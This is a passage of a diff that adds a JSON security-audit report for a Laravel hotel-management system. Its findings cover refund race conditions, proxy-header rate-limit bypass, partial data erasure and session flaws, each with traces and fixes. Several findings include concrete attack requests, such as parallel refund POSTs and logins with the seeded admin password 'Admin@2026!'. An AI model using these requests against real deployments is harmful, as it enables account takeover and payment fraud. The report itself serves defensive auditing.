+        "file": "app/Modules/Reservations/Experience/Application/DigitalCheckin.php",
+        "line": 123,
+        "scope": "sink",
+        "description": "storePhoto(): Storage::disk('local')->put(\"checkins/{hotel}/{id}-id.<ext>\", base64 bytes) with extension taken from the declared mime, bytes never checked"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Reservations/Experience/Application/DigitalCheckin.php",
+        "line": 123,
+        "description": "storePhoto(): Storage::disk('local')->put(\"checkins/{hotel}/{id}-id.<ext>\", base64 bytes) with extension taken from the declared mime, bytes never checked"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "Staff or a PDF renderer later opens the file"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Guest with a manage token (or attacker holding one via the email-reuse issue)",
+      "payloads": [
+        "see instructions (file-upload)"
+      ],
+      "instructions": [
+        "checkin(): id_photo string accepted",
+        "storePhoto(): Storage::disk('local')->put(\"checkins/{hotel}/{id}-id.<ext>\", base64 bytes) with extension taken from the declared mime, bytes never checked"
+      ],
+      "observed_result": "Arbitrary bytes up to 2 MB written under storage/app/checkins with a .jpg/.png/.webp name; when later decoded by image libraries (thumbnails, PDF embedding) malformed input reaches the decoder. No direct code execution path identified."
+    },
+    "remediation": {
+      "strategy": "Reuse the finfo-based store() logic from FrontDeskExtrasController (check magic bytes/mime of the decoded bytes before writing)."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Guest with a manage token (or attacker holding one via the email-reuse issue); Public form -> private local disk file later served inline to staff"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Arbitrary bytes up to 2 MB written under storage/app/checkins with a .jpg/.png/.webp name; when later decoded by image libraries (thumbnails, PDF embedding) malformed input reaches the decoder. No direct code execution path identified."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h3-public-files"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "public:deposit:return-url-forwarded-to-provider",
+    "title": "Booking-site deposit and pay flows forward an arbitrary return_url to Orange Money / card gateway as return_url and cancel_url (open redirect after payment)",
+    "description": "After paying, the guest is sent by the provider to an attacker-chosen site (phishing continuation); needs the attacker to initiate the intent whose redirect_url the victim then follows.",
+    "root_cause": "app/Modules/Payments/Application/Drivers/OrangeMoneyGateway.php:44 - return_url / cancel_url sent to the provider; CardGateway.php line 40 likewise",
+    "intended_behavior": "Return to the booking site after payment",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Payments/Http/PublicPaymentController.php",
+        "line": 37,
+        "scope": "entrypoint",
+        "description": "return_url validated only as 'url' (any host)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 107,
+        "scope": "propagation",
+        "description": "stored in intent meta"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Payments/Application/Drivers/OrangeMoneyGateway.php",
+        "line": 44,
+        "scope": "sink",
+        "description": "return_url / cancel_url sent to the provider; CardGateway.php line 40 likewise"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Payments/Application/Drivers/OrangeMoneyGateway.php",
+        "line": 44,
+        "description": "return_url / cancel_url sent to the provider; CardGateway.php line 40 likewise"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "third_party_dependency",
+        "description": "Attacker must get the victim to use an intent they created (e.g. shared link with the provider redirect_url)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker crafting a deposit request on behalf of a guest (requires manage token) or any pay-link payer",
+      "payloads": [
+        "see instructions (open-redirect)"
+      ],
+      "instructions": [
+        "return_url validated only as 'url' (any host)",
+        "return_url / cancel_url sent to the provider; CardGateway.php line 40 likewise"
+      ],
+      "observed_result": "After paying, the guest is sent by the provider to an attacker-chosen site (phishing continuation); needs the attacker to initiate the intent whose redirect_url the victim then follows."
+    },
+    "remediation": {
+      "strategy": "Validate return_url host against config('app.url') (or allow only paths) before storing it."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Attacker crafting a deposit request on behalf of a guest (requires manage token) or any pay-link payer; Public input -> third-party payment page redirect target"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "After paying, the guest is sent by the provider to an attacker-chosen site (phishing continuation); needs the attacker to initiate the intent whose redirect_url the victim then follows."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h3-public-files"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "public:guest-order:client-uuid-cross-reservation",
+    "title": "Guest room-service order idempotency key (client_uuid) is looked up hotel-wide, not per reservation: another guest's order is returned for a colliding/guessed uuid",
+    "description": "If uuids are predictable on the client, a guest can read another in-house guest's order totals/check ids and skip placing their own order; also an attacker can poison a uuid so that the real guest's first order silently returns the attacker's record.",
+    "root_cause": "app/Modules/GuestPortal/Application/GuestOrderService.php:64 - GuestOrder::where('client_uuid', $clientUuid)->first() without reservation_id filter; the order is returned as if it were the caller's",
+    "intended_behavior": "Retry protection for one guest's own double tap",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/GuestPortal/Http/GuestOrderController.php",
+        "line": 45,
+        "scope": "entrypoint",
+        "description": "place(): client_uuid is any string <= 64 chars"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/GuestPortal/Application/GuestOrderService.php",
+        "line": 64,
+        "scope": "sink",
+        "description": "GuestOrder::where('client_uuid', $clientUuid)->first() without reservation_id filter; the order is returned as if it were the caller's"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/GuestPortal/Application/GuestOrderService.php",
+        "line": 64,
+        "description": "GuestOrder::where('client_uuid', $clientUuid)->first() without reservation_id filter; the order is returned as if it were the caller's"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "Guessable client_uuid values"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Guest holding a signed ordering link for their own reservation",
+      "payloads": [
+        "see instructions (enumeration)"
+      ],
+      "instructions": [
+        "place(): client_uuid is any string <= 64 chars",
+        "GuestOrder::where('client_uuid', $clientUuid)->first() without reservation_id filter; the order is returned as if it were the caller's"
+      ],
+      "observed_result": "If uuids are predictable on the client, a guest can read another in-house guest's order totals/check ids and skip placing their own order; also an attacker can poison a uuid so that the real guest's first order silently returns the attacker's record."
+    },
+    "remediation": {
+      "strategy": "Add ->where('reservation_id', $r->id) to the client_uuid lookup (and a unique index on (reservation_id, client_uuid))."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Guest holding a signed ordering link for their own reservation; Own reservation -> other reservation's GuestOrder (id, total, status, pos check id)"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "If uuids are predictable on the client, a guest can read another in-house guest's order totals/check ids and skip placing their own order; also an attacker can poison a uuid so that the real guest's first order silently returns the attacker's record."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h3-public-files"
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "public:paylink:dryrun-autosucceed-nonprod",
+    "title": "Outside APP_ENV=production, providers without credentials fall back to DryRunGateway whose status() auto-succeeds: the public status poll settles a deposit/pay-link as paid with no money",
+    "description": "Any staging/demo/UAT deployment (APP_ENV=staging, demo, local) lets guests mark bookings as paid; a production host misconfigured with APP_ENV != production is fully exposed.",
+    "claimed_root_cause": "app/Modules/Payments/Application/PaymentService.php:144 - refresh(): $status from DryRunGateway::status() (Drivers/DryRunGateway.php line 158-162 returns 'succeeded') -> settle() posts the folio payment and increments deposit_paid",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Payments/Http/PublicPaymentController.php",
+        "line": 55,
+        "scope": "PublicPaymentController::status",
+        "description": "public GET status with manage token -> payments->refresh($intent) (line 61); same via PublicPayLinkController::status line 50-56"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 42,
+        "scope": "PaymentService::driverFor",
+        "description": "no credentials: throws only when app()->isProduction(); otherwise returns new DryRunGateway (line 46); driverOf (line 59) also returns DryRun for any intent stored with driver='dry_run'"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Payments/Application/Drivers/DryRunGateway.php",
+        "line": 37,
+        "scope": "DryRunGateway::status",
+        "description": "returns 'succeeded' (or 'failed' for the simulated-failure case)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 144,
+        "scope": "PaymentService::refresh",
+        "description": "non-pending status -> settle($intent, $status)"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 224,
+        "scope": "PaymentService::settle",
+        "description": "folios->payment(...) posts the folio payment line and Reservation deposit_paid is incremented (line 230-231) with no money received"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 42,
+        "description": "Explicit production gate exists: 'gateway-not-configured' DomainException when app()->isProduction()"
+      },
+      {
+        "file": "app/Modules/Payments/Application/Payouts/PayoutService.php",
+        "line": 82,
+        "description": "Same pattern for disbursements (DryRunDisbursement)"
+      }
+    ],
+    "blockers": [
+      "Decisive fact is outside source"
+    ],
+    "validation_plan": {
+      "local": "Review the deployment environment values (APP_ENV, DEMO_LOGINS, TRUSTED_PROXIES, payment gateway credentials) on every internet-facing instance and confirm the gate holds; no code path change is needed for validation.",
+      "deployment": "Owner confirms the production and staging environment files and the edge proxy configuration."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "race:folio:open-number-sequence-outside-transaction",
+    "title": "FolioService::open consumes the gapless folio number outside a transaction, so the row lock is released immediately and concurrent opens collide on the unique (hotel_id, number) index",
+    "description": "Under load (night audit + online deposit settle + front desk), one of the concurrent folio creations fails with a unique-violation 500 or two open guest folios are created for the same reservation, splitting charges across folios.",
+    "root_cause": "app/Platform/Domain/NumberSequence.php:20 - lockForUpdate() in autocommit mode: lock released after the SELECT, two callers read the same 'last'",
+    "intended_behavior": "NumberSequence docblock: 'must run inside the caller's transaction'",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 34,
+        "scope": "entrypoint",
+        "description": "NumberSequence::next() called from Folio::create outside DB::transaction (contrast invoice() line 201 which wraps it)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/FrontOffice/Database/Migrations/2026_11_02_000500_create_front_office_tables.php",
+        "line": 100,
+        "scope": "propagation",
+        "description": "unique(hotel_id, number) turns the duplicate into a 500 for one caller; guestFolioFor (FolioService:47) is also unlocked so two guest folios can be opened for one reservation"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/POS/Application/PosService.php",
+        "line": 41,
+        "scope": "propagation",
+        "description": "PosService::open has the same pattern for pos-check numbers (split() wraps it, open() does not)"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Platform/Domain/NumberSequence.php",
+        "line": 20,
+        "scope": "sink",
+        "description": "lockForUpdate() in autocommit mode: lock released after the SELECT, two callers read the same 'last'"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Platform/Domain/NumberSequence.php",
+        "line": 20,
+        "description": "lockForUpdate() in autocommit mode: lock released after the SELECT, two callers read the same 'last'"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "timing_dependency",
+        "description": "concurrent folio/check creation for the same hotel"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Two staff users / online payments opening folios at the same time",
+      "payloads": [
+        "see instructions (race)"
+      ],
+      "instructions": [
+        "NumberSequence::next() called from Folio::create outside DB::transaction (contrast invoice() line 201 which wraps it)",
+        "lockForUpdate() in autocommit mode: lock released after the SELECT, two callers read the same 'last'"
+      ],
+      "observed_result": "Under load (night audit + online deposit settle + front desk), one of the concurrent folio creations fails with a unique-violation 500 or two open guest folios are created for the same reservation, splitting charges across folios."
+    },
+    "remediation": {
+      "strategy": "Wrap open() (and PosService::open) in DB::transaction; in guestFolioFor lock the reservation row first."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Two staff users / online payments opening folios at the same time; Gapless, unique legal numbering"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Under load (night audit + online deposit settle + front desk), one of the concurrent folio creations fails with a unique-violation 500 or two open guest folios are created for the same reservation, splitting charges across folios."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "race:folio:refund-check-on-stale-balance",
+    "title": "Folio refund validates the credit balance on the unlocked Folio instance; concurrent refunds exceed the credit",
+    "description": "Two parallel refunds of a 10000 credit each pass the check; folio ends at +10000 debit and the cashier pays out 20000.",
+    "root_cause": "app/Modules/FrontOffice/Application/FolioService.php:111 - if ($folio->balance > -$amount) uses the route-bound model; post() at line 238 locks the folio only to insert the line and increment",
+    "intended_behavior": "Refund cannot exceed the credit balance",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/FrontOffice/Http/FolioController.php",
+        "line": 94,
+        "scope": "FolioController::refund",
+        "description": "POST /api/v1/folios/{folio}/refunds with folios.adjust; amount integer min:1"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 111,
+        "scope": "FolioService::refund",
+        "description": "if ($folio->balance > -$amount) throw - evaluated on the route-bound, unlocked Folio instance outside any transaction"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 238,
+        "scope": "FolioService::post",
+        "description": "Folio::lockForUpdate()->findOrFail only inside post(); balance not re-validated under the lock"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 246,
+        "scope": "FolioService::post",
+        "description": "$folio->increment('balance', $record->amount) - second concurrent refund also passes and the folio goes into debit"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Platform/ModuleServiceProvider.php",
+        "line": 47,
+        "description": "'idempotent' middleware exists but only de-duplicates requests carrying the same Idempotency-Key; two distinct keys race freely"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "folios.adjust (front-office-manager) plus an open cashier shift for the method"
+      },
+      {
+        "kind": "timing_dependency",
+        "description": "Two refund requests must interleave between the balance check and post()"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Front-office manager with folios.adjust refunding a guest with a 10000 credit",
+      "payloads": [
+        "2x concurrent POST /api/v1/folios/{id}/refunds {\"method\":\"CASH\",\"amount\":10000,\"reason\":\"x\"} with different Idempotency-Key values"
+      ],
+      "instructions": [
+        "Create a folio with balance -10000",
+        "Fire both requests in parallel",
+        "Read folios.balance"
+      ],
+      "observed_result": "Both return 201; balance ends at +10000 (20000 paid out against a 10000 credit)"
+    },
+    "remediation": {
+      "strategy": "Wrap refund() in DB::transaction, re-read the folio with lockForUpdate() before the balance comparison (or move the check into post() for type === 'refund')."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Preconditions: Staff user holding folios.adjust; Refund <= folio credit balance"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Two parallel refunds of a 10000 credit each pass the check; folio ends at +10000 debit and the cashier pays out 20000."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "rate-limit:trust-proxies-star-xff-spoof",
+    "title": "trustProxies('*') lets clients choose $request->ip(), defeating every IP-keyed throttle and the email+IP login guard",
+    "description": "All IP-based limits are bypassable; residual protection is the per-account lock (10 failures -> 15 min), i.e. ~40 password guesses/hour/account for staff, and unlimited attempts against endpoints with no per-account counter (public booking lookup by confirmation+last name, /verify/{code}, OTP send floods, audit-log noise). Audit logs also record attacker-chosen IPs",
+    "claimed_root_cause": "app/Modules/Admin/Application/LoginGuard.php:178 - RateLimiter key 'login:'.email.'|'.$ip — attacker rotates ip per request",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "bootstrap/app.php",
+        "line": 20,
+        "scope": "withMiddleware",
+        "description": "$middleware->trustProxies(at: '*') with default headers - X-Forwarded-For from any peer is honoured for $request->ip()"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Admin/Application/LoginGuard.php",
+        "line": 28,
+        "scope": "LoginGuard::key",
+        "description": "'login:'.email.'|'.$ip - email+IP throttle key; attacker rotates the XFF value per request"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Platform/ModuleServiceProvider.php",
+        "line": 31,
+        "scope": "ModuleServiceProvider::boot",
+        "description": "public-write (20/min), public-read (300/min) and api limiters keyed by $r->ip()"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Admin/AdminModule.php",
+        "line": 22,
+        "scope": "AdminModule::boot",
+        "description": "auth-token limiter keyed by ip|route"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/MemberPortal/Application/MemberAuthService.php",
+        "line": 283,
+        "scope": "MemberAuthService::limiterKey",
+        "description": "member-login limiter identifier|ip"
+      },
+      {
+        "kind": "sink",
+        "file": "routes/web.php",
+        "line": 19,
+        "scope": "routes/web.php guest group",
+        "description": "throttle:10,1 on POST /login (and two-factor-challenge line 23) keyed by IP becomes per-attacker-chosen string; residual control is the per-account lockout in LoginGuard"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "docker/nginx/default.conf",
+        "line": 1,
+        "description": "Shipped nginx expects an upstream TLS proxy and does not set/overwrite X-Forwarded-For (no proxy_set_header/real_ip directives in docker/), so it forwards whatever the client sent"
+      },
+      {
+        "file": "docs/DEPLOY.md",
+        "line": 57,
+        "description": "Docs say trusted proxies should be 127.0.0.1/the Docker network, contradicting '*' in code"
+      }
+    ],
+    "blockers": [
+      "Decisive fact is outside source"
+    ],
+    "validation_plan": {
+      "local": "Review the deployment environment values (APP_ENV, DEMO_LOGINS, TRUSTED_PROXIES, payment gateway credentials) on every internet-facing instance and confirm the gate holds; no code path change is needed for validation.",
+      "deployment": "Owner confirms the production and staging environment files and the edge proxy configuration."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "retention:guests:erasure-does-not-cover-financial-and-payment-copies-of-personal-data",
+    "title": "Approved data-protection requests anonymise the guest row, register entries, company contacts and activity log, but guest names/contacts persist in folios, invoices, payment intents, pay links and online check-ins",
+    "description": "After approval the guest still appears by name in folio lists, invoices, payment-intent searches (payer_phone ilike), pay links and online check-in records; erasure is partial and the audit entry claims full anonymisation.",
+    "root_cause": "app/Modules/FrontOffice/Application/FolioService.php:50 - folios.name is built from guest full_name and is never blanked; invoices.bill_to_name/address copy it at line 216-218",
+    "intended_behavior": "Personal fields blanked across modules; financial amounts kept",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Guests/Application/PrivacyService.php",
+        "line": 79,
+        "scope": "PrivacyService::anonymise",
+        "description": "approved erasure request blanks guests (line 82), guest_register_entries (line 90-107), company_contacts (line 112) and activity_log (line 116) only - exactly what the docblock at line 78 promises"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 50,
+        "scope": "FolioService::guestFolioFor",
+        "description": "folios.name = guest full_name + reservation number at creation and never blanked"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Payments/Http/PublicPaymentController.php",
+        "line": 48,
+        "scope": "PublicPaymentController::create",
+        "description": "payer_phone / payer_email copied into payment_intents and kept"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 216,
+        "scope": "FolioService::invoice",
+        "description": "invoices.bill_to_name/address copied from folio/company; online_checkins (BookingEngineController line 170+) and reservations.special_requests also untouched"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Guests/Application/PrivacyService.php",
+        "line": 78,
+        "description": "Docblock scopes anonymise() to profile, register and company contacts - the code matches its own stated scope; the gap is between that scope and a full-erasure expectation"
+      },
+      {
+        "file": "tests/Feature/Guests/DataProtectionTest.php",
+        "line": 1,
+        "description": "Existing test covers the guest row; extend for folios/intents"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "Guest had a stay with folio, invoice, online payment or online check-in"
+      },
+      {
+        "kind": "authorization_role",
+        "description": "Any later staff reader of folios/payment_intents/online_checkins"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user searching after an approved erasure",
+      "payloads": [
+        "GET /api/v1/folios?search=<old name>",
+        "GET /api/v1/payments/intents?phone=<old phone>"
+      ],
+      "instructions": [
+        "Create guest with reservation, folio, invoice, intent",
+        "Approve a delete request with a second user",
+        "Search folios / intents / online_checkins"
+      ],
+      "observed_result": "Original name/phone/email still visible in folios.name, payment_intents.payer_*, payment_links.payer_phone, online_checkins and reservation free text"
+    },
+    "remediation": {
+      "strategy": "Extend anonymise() to blank folios.name, payment_intents.payer_phone/payer_email, payment_links.payer_phone, online_checkins document fields and reservations.special_requests/notes for the guest; keep invoices (legal retention) but document that in the request decision note."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Preconditions: Guest exercising erasure; any later staff reader of those tables; Erasure/anonymisation promise (PrivacyService header: 'only personal fields are blanked')"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "After approval the guest still appears by name in folio lists, invoices, payment-intent searches (payer_phone ilike), pay links and online check-in records; erasure is partial and the audit entry claims full anonymisation."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "secrets:seeder:demo-admin-fixed-password-in-default-seeder",
+    "title": "DatabaseSeeder always seeds admin@opeshotelsoft.test / Admin@2026! and 20+ demo staff with Demo@2026!",
+    "description": "Any operator running the default seeder in production creates a known-password super-admin that works even with DEMO_LOGINS=false (only 2FA enrolment prompt would stand in the way, and only in the web UI)",
+    "root_cause": "database/seeders/DemoUsersSeeder.php:48 - admin password 'Admin@2026!' (line 52: all demo users 'Demo@2026!')",
+    "intended_behavior": "Demo data only for demos; production is expected to create its own owner account",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "docs/DEPLOY.md",
+        "line": 39,
+        "scope": "Production install steps (docker line 39, bare-metal line 105)",
+        "description": "'php artisan db:seed --force  # once, first install only' - the documented production install runs the default seeder"
+      },
+      {
+        "kind": "propagation",
+        "file": "database/seeders/DatabaseSeeder.php",
+        "line": 13,
+        "scope": "DatabaseSeeder::run",
+        "description": "calls DemoSeeder unconditionally (no environment guard)"
+      },
+      {
+        "kind": "propagation",
+        "file": "database/seeders/DemoSeeder.php",
+        "line": 34,
+        "scope": "DemoSeeder::run",
+        "description": "Group::firstOrCreate(['slug'=>'opes-demo']) - this is the ONLY code path in the repository that creates a Group (grep app/ database/), so a production install's real tenant is this group"
+      },
+      {
+        "kind": "propagation",
+        "file": "database/seeders/DemoSeeder.php",
+        "line": 52,
+        "scope": "DemoSeeder::run",
+        "description": "calls DemoUsersSeeder"
+      },
+      {
+        "kind": "sink",
+        "file": "database/seeders/DemoUsersSeeder.php",
+        "line": 48,
+        "scope": "DemoUsersSeeder::run",
+        "description": "admin@opeshotelsoft.test created with password 'Admin@2026!' and role group-owner ('*', line 49); 20+ staff with 'Demo@2026!' (line 52)"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "routes/web.php",
+        "line": 19,
+        "description": "POST /login accepts the seeded credentials; AuthenticatedSessionController has no status/environment guard"
+      },
+      {
+        "file": "app/Modules/Admin/public-routes.php",
+        "line": 7,
+        "description": "POST /api/v1/auth/token also accepts them (API access without the web MFA enrolment prompt - see AuthHardeningTest::test_token_issued_without_2fa)"
+      },
+      {
+        "file": "database/seeders/RolesAndPermissionsSeeder.php",
+        "line": 30,
+        "description": "'group-owner' => '*'"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Operator followed docs/DEPLOY.md and ran db:seed on the production database (the documented first-install step) and did not change the admin password"
+      },
+      {
+        "kind": "user_interaction",
+        "description": "None beyond knowing the public seeder"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous internet user who has read the public repository",
+      "payloads": [
+        "POST /login {\"email\":\"admin@opeshotelsoft.test\",\"password\":\"Admin@2026!\"}",
+        "POST /api/v1/auth/token {\"email\":\"admin@opeshotelsoft.test\",\"password\":\"Admin@2026!\",\"device_name\":\"x\"}"
+      ],
+      "instructions": [
+        "Submit the login form or token request on the target host",
+        "If MFA enrolment is required in the web UI, enrol an attacker TOTP device (no second factor existed before)",
+        "Use the group-owner session"
+      ],
+      "observed_result": "Full group-owner access to the production tenant (users, payroll, accounting, exports)"
+    },
+    "remediation": {
+      "strategy": "Remove DemoSeeder from DatabaseSeeder (keep RolesAndPermissionsSeeder only) and provide an interactive artisan command (e.g. ops:create-owner) that creates the real group and owner with a random or prompted password; make DemoSeeder/DemoUsersSeeder return early when app()->isProduction() unless an explicit flag is passed."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Anonymous user who knows the public seeder (source is in the repo/docs); Unauthenticated -> '*' role via a documented default credential if `php artisan db:seed` was ever run on the instance"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Any operator running the default seeder in production creates a known-password super-admin that works even with DEMO_LOGINS=false (only 2FA enrolment prompt would stand in the way, and only in the web UI)"
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "session:2fa-pending-state-stored-before-session-regenerate",
+    "title": "Web 2FA pending state (2fa.user_id) is written into the pre-authentication session without regenerating the id",
+    "description": "An attacker holding the same session id knows the victim has entered a valid password (state 2fa.user_id present, /two-factor-challenge renders) and can race the TOTP step; practical impact is low because the final login regenerates, but the pending state and remember flag are unprotected",
+    "root_cause": "app/Http/Controllers/Auth/TwoFactorController.php:91 - verify() trusts 2fa.user_id; the full login regenerates (line 102) only after success",
+    "intended_behavior": "Session regeneration on privilege change",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Http/Controllers/Auth/AuthenticatedSessionController.php",
+        "line": 40,
+        "scope": "entrypoint",
+        "description": "session()->put('2fa.user_id', $user->id) with the current (possibly fixated) session id"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Http/Controllers/Auth/TwoFactorController.php",
+        "line": 91,
+        "scope": "sink",
+        "description": "verify() trusts 2fa.user_id; the full login regenerates (line 102) only after success"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Http/Controllers/Auth/TwoFactorController.php",
+        "line": 91,
+        "description": "verify() trusts 2fa.user_id; the full login regenerates (line 102) only after success"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "session fixation or shared session cookie"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker who can plant a session cookie in the victim's browser (session fixation), or who shares a device",
+      "payloads": [
+        "see instructions (session)"
+      ],
+      "instructions": [
+        "session()->put('2fa.user_id', $user->id) with the current (possibly fixated) session id",
+        "verify() trusts 2fa.user_id; the full login regenerates (line 102) only after success"
+      ],
+      "observed_result": "An attacker holding the same session id knows the victim has entered a valid password (state 2fa.user_id present, /two-factor-challenge renders) and can race the TOTP step; practical impact is low because the final login regenerates, but the pending state and remember flag are unprotected"
+    },
+    "remediation": {
+      "strategy": "Call $request->session()->regenerate() before putting 2fa.user_id, and expire the pending state (store a timestamp, reject after 5 minutes)"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Attacker who can plant a session cookie in the victim's browser (session fixation), or who shares a device; Pre-auth session -> half-authenticated (password proven) state bound to the victim's user id"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "An attacker holding the same session id knows the victim has entered a valid password (state 2fa.user_id present, /two-factor-challenge renders) and can race the TOTP step; practical impact is low because the final login regenerates, but the pending state and remember flag are unprotected"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "session:password-change-keeps-other-sessions-and-tokens",
+    "title": "Changing the staff password (and member password reset) does not invalidate other sessions or Passport tokens",
+    "description": "Attacker's session (120 min / remember-me) and 12 h API tokens keep working after the victim rotates the password",
+    "root_cause": "app/Http/Controllers/ProfileController.php:47 - password() updates the hash only; no Auth::logoutOtherDevices(), no tokens()->revoke",
+    "intended_behavior": "Password change as the user's remediation after suspected compromise",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "routes/web.php",
+        "line": 144,
+        "scope": "entrypoint",
+        "description": "POST /profile/password"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/MemberPortal/Application/MemberAuthService.php",
+        "line": 195,
+        "scope": "propagation",
+        "description": "member reset() same: other member sessions survive"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Http/Controllers/ProfileController.php",
+        "line": 47,
+        "scope": "sink",
+        "description": "password() updates the hash only; no Auth::logoutOtherDevices(), no tokens()->revoke"
+      }
+    ],
+    "evidence": [
+      {
